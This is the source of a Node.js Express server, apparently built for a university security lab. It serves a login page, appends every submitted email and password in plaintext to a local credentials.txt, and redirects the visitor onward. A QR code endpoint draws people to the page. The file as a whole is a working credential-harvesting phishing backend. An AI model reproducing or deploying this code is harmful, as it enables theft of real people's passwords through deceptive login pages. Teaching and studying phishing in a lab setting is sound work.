const express = require("express");
const fs = require("fs");
const path = require("path");
const serveIndex = require('serve-index');
const QRCode = require('qrcode');
const vhost = require('vhost');

const app = express();
const zyraApp = express();
const PORT = 80;

// Middleware to parse form data
zyraApp.use(express.urlencoded({ extended: true }));
zyraApp.use(express.json());

// login get
zyraApp.get("/login", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
})

// endpoint to generate QR
zyraApp.get("/qrcode", async (req, res) => {
  try {
    const url = `http://zyra.csf.syssec.dpss.inesc-id.pt:${PORT}/public`;
    const qr = await QRCode.toDataURL(url);
    res.send(`<img src="${qr}">`);
  } catch (err) {
    res.status(500).send("Error generating QR code");
  }
});

// Handle login POST
zyraApp.post("/login", (req, res) => {
  const { email, password } = req.body;

  // Save to credentials.txt
  const filePath = path.join(__dirname, "credentials.txt");
  const line = `Email: ${email}, Password: ${password}\n`;

  fs.appendFile(filePath, line, (err) => {
    if (err) {
      console.error("Error writing file:", err);
      return res.status(500).send("Server error");
    }
  });
  res.redirect("/public")
});

// Block access to credentials.txt
zyraApp.use((req, res, next) => {
  if (/^\/credentials\.txt(\/|$)/.test(req.path)) {
    return res.status(403).send('Forbidden');
  }
  next();
});

// Block access to node_modules/
zyraApp.use((req, res, next) => {
  if (/^\/node_modules(\/|$)/.test(req.path)) {
    return res.status(403).send('Forbidden');
  }
  next();
});

zyraApp.use(express.static(__dirname));
zyraApp.use('/', serveIndex(__dirname, { icons: true }));

// Enable directory listing
app.use(vhost('zyra.csf.syssec.dpss.inesc-id.pt', zyraApp));
app.use((req, res) => {
  res.status(404).send("Not served here");
});

app.listen(PORT, () => {
  console.log(`🚀 Server running at http://zyra.csf.syssec.dpss.inesc-id.pt:${PORT}/public`);
});
